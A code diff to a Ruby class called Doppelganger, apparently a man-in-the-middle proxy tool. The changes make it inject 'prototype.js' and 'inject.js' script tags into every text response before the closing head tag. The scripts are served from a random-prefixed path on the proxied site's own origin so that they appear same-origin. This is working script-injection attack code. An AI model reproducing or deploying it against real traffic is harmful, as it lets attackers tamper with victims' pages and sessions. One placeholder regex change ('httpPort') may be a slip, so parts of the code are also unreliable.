@@ -162,10 +162,18 @@ class Doppelganger
 
 		@Server = nil
 
+		@RandomNum = 0
+
 		def initialize(config)
 			# Javascript get loaded in reverse order (LIFO)
 			@InjectionScripts = Array["prototype.js", "inject.js"]
 			#@PackedScripts = {}
+
+			machine_bytes = ['foo'].pack('p').size
+			machine_bits = machine_bytes * 8
+			max_unsigned = 2**machine_bits -1
+
+			@RandomNum = rand(max_unsigned);
 
 			@ProxyAddr = config[:ProxyAddr]
 			@ProxyPort = config[:ProxyPort]
@@ -218,6 +226,19 @@ class Doppelganger
 		end
 
 		def TransformContents(request, response)
+			uri = URI.parse(request.request_uri.to_s)
+			@InjectionScripts.each { |script| 
+				script_request = "/#{@RandomNum}_#{script}"
+				#puts "Script path: #{script_request}; URI.Path: #{uri.path}"
+				if uri.path == script_request
+					file = File.open("#{@HttpdFileRoot}#{script}", "r")						
+					response.body = file.read
+					response.status = 200
+					file.close
+					return response.body
+				end
+			}
+
 			perform_transformation = true
 
 			if @ProxyInclusionList != nil
@@ -258,8 +279,13 @@ class Doppelganger
 				end
 			}
 
+			
+
 			if perform_transformation && response.content_type =~ /text/i
 					server_url = "http://" + @HttpdAddr + ":" + @HttpdPort.to_s + "/"
+
+					
+					server_url = "#{uri.scheme}://#{uri.host}:#{uri.port}/"
 
 					#TODO: Inject Javascript
 					@InjectionScripts.each { |script|
@@ -270,7 +296,7 @@ class Doppelganger
 						#@PackedScripts[script] = unpacked_code
 
 						#html = "<script language=\"javascript\" type=\"text/javascript\">#{unpacked_code}</script></head>"
-						js_url = server_url + script
+						js_url = "#{server_url}#{@RandomNum}_#{script}"
 						html = "<script src=\"" + js_url + "\" language=\"javascript\" type=\"text/javascript\"></script></head>"
 						response.body.gsub!(/\<\/head\>/i, html)
 					}	
@@ -357,7 +383,7 @@ class Doppelganger
       	template_file.close
 
       	new_file = File.open(@HttpdFileRoot + new_tpl, "w")
-				new_file.syswrite(template_data.gsub(/proxyIpAddr/, @ProxyAddr).gsub(/proxyPort/, @ProxyPort.to_s).gsub(/httpdIpAddr/, @HttpdAddr).gsub(/httpdPort/, @HttpdPort.to_s))
+				new_file.syswrite(template_data.gsub(/proxyIpAddr/, @ProxyAddr).gsub(/proxyPort/, @ProxyPort.to_s).gsub(/httpdIpAddr/, @HttpdAddr).gsub(/httpPort/, @HttpdPort.to_s))
       	new_file.close
 				puts "done"
 			}
